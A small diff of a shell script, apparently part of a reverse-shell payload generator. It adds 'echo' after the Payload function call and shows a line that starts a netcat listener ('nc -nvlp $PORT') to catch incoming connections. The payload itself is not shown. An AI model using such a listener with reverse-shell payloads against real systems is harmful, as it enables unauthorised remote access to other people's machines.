@@ -82,7 +82,7 @@ Payload(){
 }
 
 
-Payload
+Payload; echo
 
 
 [ "$RUN" != False ] && printf "\n[+] Staring Netcat Listener:\n" && nc -nvlp $PORT
